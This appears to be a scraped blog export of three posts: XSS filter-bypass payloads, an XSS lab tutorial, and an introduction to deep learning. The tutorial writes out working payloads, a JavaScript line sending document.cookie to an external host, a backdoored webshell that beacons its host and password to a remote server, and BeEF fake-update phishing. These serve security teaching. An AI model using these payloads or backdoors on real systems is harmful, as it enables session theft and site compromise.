/ &quot; &#x27; return ` &lt;script&gt; // alert(&#x27;$&#123;input&#125;&#x27;) 注释只能注释掉这一行 &lt;/script&gt; `&#125;xxalert(1)--&gt; js的注释符，让后面的语句不生效 （2）注释符//// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\\\/g, &#x27;\\\\\\\\&#x27;) .replace(/&#x27;/g, &#x27;\\\\\\&#x27;&#x27;) .replace(/&quot;/g, &#x27;\\\\&quot;&#x27;) .replace(/`/g, &#x27;\\\\`&#x27;) .replace(/&lt;/g, &#x27;\\\\74&#x27;) .replace(/&gt;/g, &#x27;\\\\76&#x27;) .replace(/\\//g, &#x27;\\\\/&#x27;) .replace(/\\n/g, &#x27;\\\\n&#x27;) .replace(/\\r/g, &#x27;\\\\r&#x27;) .replace(/\\t/g, &#x27;\\\\t&#x27;) .replace(/\\f/g, &#x27;\\\\f&#x27;) .replace(/\\v/g, &#x27;\\\\v&#x27;) // .replace(/\\b/g, &#x27;\\\\b&#x27;) .replace(/\\0/g, &#x27;\\\\0&#x27;) &#125; s = escapeJs(s) return `&lt;script&gt; var url = &#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27; var a = document.createElement(&#x27;a&#x27;) a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; &emsp;&emsp;payload：&quot;);alert(1)// &emsp;&emsp;通过源码发现一些字符被转义了，就连换行符也被转义了。但是发现竟然还可以用，原因是//虽然被转义成了//，但转义之后还是//，在js中还是注释符（勿与正则混淆） 14、使用古英语function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;) &lt;碰到字母就变成&lt;_ input = input.toUpperCase() return &#x27;&lt;h1&gt;&#x27; + input + &#x27;&lt;/h1&gt;&#x27;&#125; &emsp;&emsp;使用维基百科搜索s，会发现长s，古英语的s &emsp;&emsp;举一反三，碰到其他字母是否也可以用古英语 &emsp;&emsp;payload： &lt;ſcript src=&#x27;http://127.0.0.1/ABC.JS&#x27;&gt;&lt;/script&gt; 15、使用伪协议&lt;a href=&quot;javascript:alert(1)&quot;&gt; 三、Waf防护与绕过演示&emsp;&emsp;就使用xss-labs这个靶场的第一关和某狗作为演示 分析拦截情况 通过去除关键词或关键词的其中某些字母判断拦截了什么关键词，如下正常 而如下就不正常了 如下正常。说明是匹配了&lt;script&gt;标签 尝试大小写绕过不行后，利用XSS平台，发现后面&lt;/h2&gt;的&gt;把前面的给包起来了，导致访问的链接拼接了&lt;/h2 使用引号包裹链接即可 使用超链接也可以，但是&lt;a href=xxx&gt;猜测也就会检测href，而事实也确实如此，只需要在href前加/即可绕过，也不影响语义，而之所以加/能绕过，是因为在前端中/经常出现在闭合的后标签，加上后就会让waf误以为是结束标签 四、常规Waf绕过思路[+] 标签语法替换[+] 特殊符号干扰 比如 / #[+] 提交方式更改 Request的前提下，Waf只检查URL内容而不检查POST内容[+] 垃圾数据溢出 [+] 加密解密算法[+] 结合其他漏洞绕过 五、XSS自动化工具1、Xwaf&emsp;&emsp;下载链接：https://github.com/3xp10it/xwaf &emsp;&emsp;现在作者貌似不再维护该项目了 2、XSStrike&emsp;&emsp;下载链接：https://github.com/s0md3v/XSStrike XSStrike 主要特点：[+] 反射和 DOM XSS 扫描[+] 多线程爬虫[+] Context 分析[+] 可配置的核心[+] 检测和规避 WAF[+] 老旧的 JS 库扫描[+] 智能 payload 生成器[+] 手工制作的 HTML &amp; JavaScript 解析器[+] 强大的 fuzzing 引擎[+] 盲打 XSS 支持[+] 高效的工作流[+] 完整的 HTTP 支持[+] Bruteforce payloads 支持[+] Payload 编码 &emsp;&emsp;相关参数 -h, --help //显示帮助信息-u, --url //指定目标 URL--data //POST 方式提交内容-v, --verbose //详细输出-f, --file //加载自定义 paload 字典-t, --threads //定义线程数-l, --level //爬行深度-t, --encode //定义 payload 编码方式--json //将 POST 数据视为 JSON--path //测试 URL 路径组件--seeds //从文件中测试、抓取 URL--fuzzer //测试过滤器和 Web 应用程序防火墙。--update //更新--timeout //设置超时时间--params //指定参数--crawl //爬行--proxy //使用代理--blind //盲测试--skip //跳过确认提示--skip-dom //跳过 DOM 扫描--headers //提供 HTTP 标头-d, --delay //设置延迟 六、Fuzzing测试 在线生成Fuzzing字典：XSS Fuzzer Fuzzing字典：https://github.com/TheKingOfDuck/fuzzDicts 七、XSS（带过滤）靶场实战 Xss-labs Xss靶场通关 Java Xss测试平台","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"}],"author":"w01ke"},{"title":"跨站脚本攻击XSS","slug":"跨站脚本攻击XSS","date":"2022-01-30T14:45:22.000Z","updated":"2022-01-30T16:37:11.878Z","comments":true,"path":"post/e0b257ee.html","link":"","permalink":"https://wolke.cn/post/e0b257ee.html","excerpt":"","text":"一、XSS跨站漏洞（1）XSS简介&emsp;&emsp;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 &emsp;&emsp;跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容 &emsp;&emsp;攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。 &emsp;&emsp;xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。 &lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt; （2）产生层面&emsp;&emsp;产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果 （3）函数类&emsp;&emsp;比如说php中的脚本的输出函数 &emsp;&emsp;常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export （4）危害影响 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 盗窃企业重要的具有商业价值的资料 非法转账 强制发送电子邮件 网站挂马 控制受害者机器向其它网站发起攻击 &emsp;&emsp;其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert(&quot;say something&quot;)的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。 窃取网页浏览中的cookie值。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用） 劫持流量实现恶意跳转。这个很简单，就是在网页中想办法插入一句像这样的语句： &lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。 （5）浏览器内核版本&emsp;&emsp;利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截） （6）常出现场景&emsp;&emsp;文章发表、评论、留言、注册资料的地方、修改资料的地方等 二、XSS攻击的分类&emsp;&emsp;XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击 （1）来自内部的攻击&emsp;&emsp;主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。 （2）来自外部的攻击&emsp;&emsp;主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。 三、XSS的分类1、反射型(非持久化)（1）原理&emsp;&emsp;反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。 （2）攻击方式&emsp;&emsp;攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞 （3）判断是否存在反射型xss漏洞并利用① 判断有没有过滤一些特殊的字符&emsp;&emsp;比如对比输出的字符和输出的字符，可以看到有些字符被过滤了 ② 注入代码&emsp;&emsp;下面是大概的原理 &emsp;&emsp;假如我输入的是1，提交后，点击查看网页源代码 ③ 插入代码&emsp;&emsp;&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt; #如果读取图片失败，则用alert显示相关信息 &emsp;&emsp;显示了信息，则说明存在xss注入 &emsp;&emsp;可以对比看到，通过前面的闭合以及后面的代码插入，读取不到图片，因此触发了alert弹窗，显示了括号内的内容即/xss/ ④ 利用xss漏洞&emsp;&emsp;将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息 2、存储型(持久化) （1）原理&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击 （2）攻击方式&emsp;&emsp;这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行 （3）payload&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt; 注入后重新刷新发现直接回显注入的东西，说明是存储型xss 3、DOM型 （1）原理&emsp;&emsp;文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分 &emsp;&emsp;DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情 &emsp;&emsp;DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。 &emsp;&emsp;基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。 （2）攻击方式&emsp;&emsp;用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞 （3）payload &lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt; 四、XSS攻击的途径XSS攻击方法只是利用HTML的属性做各种尝试，找出注入的方法。现在对三种XSS攻击的主要方式进行分析。 第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie. 第二种：在代码区内存在有用户输入的内容 第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。 五、靶场实战1、PHP开源多功能留言板（1）搭建靶场PHP开源多功能留言板下载地址：https://down.chinaz.com/soft/37581.htm ，按照教程安装即可 （2）XSS平台 网址1：https://xss.pt/xss.php 网址2：http://xss.fbisb.com/xss.php 网址3：https://xss8.cc/login/ 网址4：https://xsshs.cn/xss.php?do=login （3）进行攻击① 初次尝试尝试用简单的JS代码进行XSS攻击 存在JS过滤 ② 绕过&lt;script&gt;检测使用以下语句绕过&lt;script &gt;过滤：&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt; 成功弹出弹窗 管理员后台查看也会弹出弹窗 而弹出弹窗的原因就是这句JS代码嵌入到了代码中 ③ 利用XSS平台获取cookie此时利用XSS平台，启用默认模块，因为这个留言板会过滤&lt;script&gt;标签，因此我选择使用img标签进行XSS攻击 发送payload成功 管理员到后台查看留言 此时XSS平台就有记录了 ④ 使用firebug登录后台获取到访问的URL： URL：http://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1Cookie：valueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95 用获取到的cookie和后台链接，使用firebug进行设置 成功进入后台！ &emsp;&emsp;注意：因为是留言板，因此别人查看我们留下的XSS攻击代码时，也会记录到XSS平台，因此查看XSS平台的记录时注意甄别访客和管理员 2、BUUCTF-basic-BUU XSS COURSE 1 👉《BUUCTF-basic-BUU XSS COURSE 1》👈 3、订单系统——军锋真人CS野战123（1）靶场下载链接：https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg ，提取码：rtra （2）靶场安装注意下载安装好后仔细查看安装说明，比如config.php的数据库账密要对，否则连接不上数据库 如果访问install.php提示以下信息，按照提示操作即可 在真实机部署环境时出现了一系列问题（后台登录页面验证码无法显示），我是在Win7虚拟机，PHP版本为5.3.29部署成功的 （3）进行攻击① 初次尝试攻击者在具体要求一栏构造payload：&lt;script&gt;alert(1)&lt;/script&gt; 管理员在后台进行查看时就会弹出弹窗 正是因为我们的JS代码嵌入到了其中 ② XSS平台获取cookie选择XSS平台的攻击代码 提交 管理员在后台查看时就会触发攻击代码 此时在XSS平台就能查看到获取的信息 ③ postman登录后台postman下载地址：https://www.postman.com/downloads/ （4）Beef结合XSS攻击① 安装Beef-xss最新版kali安装beef-xss apt-get install beef-xss 如果遇到找不到包 解决方案 # 编辑文件sudo vim /etc/apt/sources.list# 添加旧的资源信息deb http://http.kali.org/kali kali-rolling main contrib non-free# For source package access, uncomment the following line# deb-src http://http.kali.org/kali kali-rolling main contrib non-freedeb http://http.kali.org/kali sana main non-free contribdeb http://security.kali.org/kali-security sana/updates main contrib non-free# For source package access, uncomment the following line# deb-src http://http.kali.org/kali sana main non-free contrib# deb-src http://security.kali.org/kali-security sana/updates main contrib non-freedeb http://old.kali.org/kali moto main non-free contrib# For source package access, uncomment the following line# deb-src http://old.kali.org/kali moto main non-free contrib# 更新资源列表sudo apt-get update 更新完毕后重新安装目标应用即可 安装完成后，直接使用beef-xss启动会有启动失败的问题，目前还不知道解决方法 但是可以进入/usr/share/beef-xss/目录，使用./beef启动即可 如果需要修改登录账号密码可以修改config.yaml文件 ② 使用beef-xss启动beef后，插入钩子，提交 后台管理员查看订单触发XSS 成功上线 获取Cookie 浏览器跳转 社工攻击，利用模拟Flash更新向客户端发送请求，来实现下载后门 客户端显示，点击就下载后门 4、WebShell箱子管理系统&emsp;&emsp;就是使用别人的webshell来进行获取服务器shell，但获取shell后webshell存在的恶意代码就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行信息收集，通过大量获取的网站shell来进行贩卖，而使用webshell的人就成打工仔了。 &emsp;&emsp;反杀的意思就是像上面的窃取cookie道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到反客为主！ &emsp;&emsp;既然说到了WebShell，推荐一个WebShell库：https://github.com/tennc/webshell （1）搭建靶场① 靶场下载靶场下载：链接：https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA 提取码：gay7 ② 小旋风下载&emsp;&emsp;搭建一个asp的服务器，我们这里选用小旋风进行搭建http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip，下载完成后解压到虚拟机里面 &emsp;&emsp;默认端口为80。如果80端口被占用或不想用80可用记事本打开host.ini增加端口网站服务 ③ 靶场搭建&emsp;&emsp;将下载好的webshell箱子放在搭建好的服务器里面，这里我放到了8001端口下 &emsp;&emsp;这里存在一个问题，访问该网址时只能访问http://localhost:8001/xxx ，访问127.0.0.1或者内网IP地址都会报418 Host Not Found的错误 &emsp;&emsp;经过排查终于知道是哪里出了问题，只需要将这里修改成对应的IP地址，重启服务即可 &emsp;&emsp;假如我们向wolke.cn传入了别人留了后门的木马，进行连接，访问了http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1 ，这个时候别人在后台就能看到我们的webshell，坐收渔翁之利 （2）进行攻击① 模拟webshell原作者进行后门攻击&emsp;&emsp;登录后台（账号密码都为：admin） &emsp;&emsp;去找一个免杀WebShell，然后加上我自己的后门 $password = &quot;sqzr&quot;;$url = $_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]; // HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名echo &quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=$url&amp;pass=$password&amp;id=1&#x27;&gt;&quot;;?&gt; &emsp;&emsp;模拟上传WebShell到某网站，并且进行连接触发后门 &emsp;&emsp;这时我们就打开webshell箱子发现我们的后门了（实验时发现木马路径太长，即使触发了后门也无法记录到webshell箱子中去） ② 反杀webshell原作者&emsp;&emsp;有的webshell原作者会利用加密、编码、拼接字符等技术来隐藏URL，因此我们使用别人的webshell时一定要进行代码审计 &emsp;&emsp;当我们代码审计获取到webshell沙箱的URL后，通过访问webshell沙箱来植入XSS代码窃取cookie &emsp;&emsp;此时沙箱管理员查看PHP信封，就会看到我们的恶意数据，同时也会触发XSS攻击代码 &emsp;&emsp;XSS平台新增记录 &emsp;&emsp;使用postman进入后台，直接反杀 5、使用JS代码获取Cookie&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;script&gt; 六、XSS攻击的检测 在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。 输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。 通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。 提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。 Tips： 通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS； 有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行； 通过变化不同的script，尝试绕过后台的过滤机制。 下图为跨站脚本攻击流程图（Cookies） &emsp;&emsp;从图中可以看出：用户访问存在XSS漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意js的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。 七、获取Session思路&emsp;&emsp;有的时候获取了Cookie，但是少了Session，会造成登不进后台 &emsp;&emsp;服务器开启了Session验证的话，我们只获取客户端的Cookie是没有办法通过验证的， &emsp;&emsp;而且我们也无法获取存放在服务端的Session &emsp;&emsp;如果需要获取Session，可以借助辅助文件，比如访问php探针时就会携带Session &emsp;&emsp;如果能利用XSS让管理员页面跳转到phpinfo()界面，通过返回源码就能窃取Session &emsp;&emsp;利用beef进行页面跳转 &emsp;&emsp;获取页面源码 &emsp;&emsp;获取源码中的cookie和session 八、HttpOnly1、什么是HttpOnly&emsp;&emsp;如果Cookie中设置了HttpOnly属性，那么通过JS脚本将无法读取到Cookie信息，这样能有效防止XSS攻击，窃取Cookie内容。 但是还是存在xss跨站语句，阻止的仅仅是获取cookie &emsp;&emsp;各个主流的脚本语言都支持HttpOnly 2、HttpOnly的设置样例（1）JavaEEresponse.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;); &emsp;&emsp;具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取 Cookie cookies[]=request.getCookies(); （2）C#HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;); myCookie.HttpOnly = true; Response.AppendCookie(myCookie); （3）VB.NETDim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;) myCookie.HttpOnly = True Response.AppendCookie(myCookie) 但是在 .NET 1.1 ,中您需要手动添加 Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;; （4）PHP≥5.2&emsp;&emsp;PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中 session.cookie_httponly = &emsp;&emsp;设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启： &lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); // or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; &emsp;&emsp;Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); （5）PHP4和PHP≤5.1&emsp;&emsp;对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了： &lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);?&gt; 3、反制HttpOnly&emsp;&emsp;当对方开启HttpOnly时，盗取cookie就会失败。登录后台的方式有Cookie登录和账号密码登录 （1）Cookie形式（2）直接账号密码登录① 读取保存账号密码&emsp;&emsp;通过窃取保存在本地的数据（账号密码）来登录后台（需要xss产生于登录地址，利用表单劫持） &emsp;&emsp;type、id、name通过查看网站源代码中的登录框表单 ② 读取没保存账号密码&emsp;&emsp;通过表单（登录框）劫持数据（产生在后台的XSS，例如存储型XSS留言等） &emsp;&emsp;劫持原理：抓取数据包另外发送一份到跨站平台 &emsp;&emsp;但是如果是https网站的话，数据是进行了ssl加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。 九、安全修复方案 开启HttpOnly 过滤输入：对输入进行过滤，不允许可能导致XSS攻击的字符输入 过滤输出：根据输出点的位置对输出到前端的内容进行适当转义 PHP（被阻断）：http://www.zuimoge.com/212.html 关于XSS漏洞修复（JAVA）：https://www.cnblogs.com/baixiansheng/p/9001522.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"}],"author":"w01ke"},{"title":"深度学习基础——什么是深度学习","slug":"深度学习基础——什么是深度学习","date":"2022-01-14T11:17:07.000Z","updated":"2022-01-15T07:46:23.968Z","comments":true,"path":"post/76a6120c.html","link":"","permalink":"https://wolke.cn/post/76a6120c.html","excerpt":"","text":"一、人工智能、机器学习与深度学习&emsp;&emsp;首先，在提到人工智能时，我们需要明确定义所讨论的内容。什么是人工智能，机器学习与深度学习。这三者之间有什么关系 1、人工智能（AI）&emsp;&emsp;人工智能的简介定义如下：努力将通常由人类完成的智能任务自动化。 2、机器学习（Machine Learning）&emsp;&emsp;机器学习的概念就来自于图灵的这个问题：对于计算机而言，除了“我们命令它做的任何事情”之外，它能否自我学习执行特定任务的方法？计算机能否让我们大吃一惊？如果没有程序员精心编写的数据处理规则，计算机能否通过观察数据自动学会这些规则？ &emsp;&emsp;图灵的这个问题引出了一种新的编程范式。在经典的程序设计（即符号主义人工智能的范式）中，人们输入的是规则（即程序）和需要根据这些规则进行处理的数据，系统输出的是答案。利用机器学习，人们输入的是数据和从这些数据中预期得到的答案，系统输出的是规则。这些规则随后可应用于新的数据，并使计算机自主生成答案。 &emsp;&emsp;机器学习系统是训练出来的，而不是明确地用程序编写出来的。将与某个任务相关的许多示例输入机器学习系统，它会在这些示例中找到统计结构，从而最终找到规则将任务自动化。举个例子，你想为度假照片添加标签，并且希望将这项任务自动化，那么你可以将许多人工打好标签的照片输入机器学习系统，系统将学会将照片与特定标签联系在一起的统计规则。 （1）概率建模&emsp;&emsp;概率建模（probabilistic modeling）是统计学原理在数据分析中的应用。它是最早的机器学习形式之一，至今仍在广泛使用。其中最有名的算法之一就是朴素贝叶斯算法。 &emsp;&emsp;朴素贝叶斯是一类基于应用贝叶斯定理的机器学习分类器，它假设输入数据的特征都是独立的。这是一个很强的假设，或者说“朴素的”假设，其名称正来源于此。这种数据分析方法比计算机出现得还要早，在其第一次被计算机实现（很可能追溯到20世纪50年代）的几十年前就已经靠人工计算来应用了。贝叶斯定理和统计学基础可以追溯到18世纪，你学会了这两点就可以开始使用朴素贝叶斯分类器了。 &emsp;&emsp;另一个密切相关的模型是logistic回归（logistic regression，简称logreg），它有时被认为是现代机器学习的“hello world”。不要被它的名称所误导——logreg是一种分类算法，而不是回归算法。与朴素贝叶斯类似，logreg的出现也比计算机早很长时间，但由于它既简单又通用，至今仍然很有用。面对一个数据集，数据科学家通常会首先尝试使用这个算法，以便初步熟悉手头的分类任务。 （2）核方法（Kernel Method）&emsp;&emsp;核方法是一组分类算法，其中最有名的就是支持向量机（SVM, support vector machine）。虽然Vladimir Vapnik和AlexeyChervonenkis早在1963年就发表了较早版本的线性公式[插图]，但SVM的现代公式由Vladimir Vapnik和Corinna Cortes于20世纪90年代初在贝尔实验室提出，并发表于1995年。 &emsp;&emsp;SVM的目标是通过在属于两个不同类别的两组数据点之间找到良好决策边界（decision boundary，见图）来解决分类问题。决策边界可以看作一条直线或一个平面，将训练数据划分为两块空间，分别对应于两个类别。对于新数据点的分类，你只需判断它位于决策边界的哪一侧。 SVM通过两步来寻找决策边界。 将数据映射到一个新的高维表示，这时决策边界可以用一个超平面来表示（如果数据像上图那样是二维的，那么超平面就是一条直线）。 尽量让超平面与每个类别最近的数据点之间的距离最大化，从而计算出良好决策边界（分割超平面），这一步叫作间隔最大化（maximizing the margin）。这样决策边界可以很好地推广到训练数据集之外的新样本。 &emsp;&emsp;将数据映射到高维表示从而使分类问题简化，这一技巧可能听起来很不错，但在实践中通常是难以计算的。这时就需要用到核技巧（kernel trick，核方法正是因这一核心思想而得名）。其基本思想是：要想在新的表示空间中找到良好的决策超平面，你不需要在新空间中直接计算点的坐标，只需要在新空间中计算点对之间的距离，而利用核函数（kernel function）可以高效地完成这种计算。核函数是一个在计算上能够实现的操作，将原始空间中的任意两点映射为这两点在目标表示空间中的距离，完全避免了对新新示进行直接计算。核函数通常是人为选择的，而不是从数据中学到的——对于SVM来说，只有分割超平面是通过学习得到的。 &emsp;&emsp;SVM刚刚出现时，在简单的分类问题上表现出了最好的性能。当时只有少数机器学习方法得到大量的理论支持，并且适合用于严肃的数学分析，因而非常易于理解和解释，SVM就是其中之一。由于SVM具有这些有用的性质，很长一段时间里它在实践中非常流行。 &emsp;&emsp;但是，SVM很难扩展到大型数据集，并且在图像分类等感知问题上的效果也不好。SVM是一种比较浅层的方法，因此要想将其应用于感知问题，首先需要手动提取出有用的表示（这叫作特征工程），这一步骤很难，而且不稳定。 （3）决策树、随机森林与梯度提升机&emsp;&emsp;决策树（decision tree）是类似于流程图的结构，可以对输入数据点进行分类或根据给定输入来预测输出值（见图）。决策树的可视化和解释都很简单。在21世纪前十年，从数据中学习得到的决策树开始引起研究人员的广泛关注。到了2010年，决策树经常比核方法更受欢迎 &emsp;&emsp;特别是随机森林（random forest）算法，它引入了一种健壮且实用的决策树学习方法，即首先构建许多决策树，然后将它们的输出集成在一起。随机森林适用于各种各样的问题——对于任何浅层的机器学习任务来说，它几乎总是第二好的算法。广受欢迎的机器学习竞赛网站Kaggle在2010年上线后，随机森林迅速成为平台上人们的最爱，直到2014年才被梯度提升机所取代。与随机森林类似，梯度提升机（gradientboosting machine）也是将弱预测模型（通常是决策树）集成的机器学习技术。它使用了梯度提升方法，通过迭代地训练新模型来专门解决之前模型的弱点，从而改进任何机器学习模型的效果。将梯度提升技术应用于决策树时，得到的模型与随机森林具有相似的性质，但在绝大多数情况下效果都比随机森林要好。它可能是目前处理非感知数据最好的算法之一（如果非要加个“之一”的话）。和深度学习一样，它也是Kaggle竞赛中最常用的技术之一。 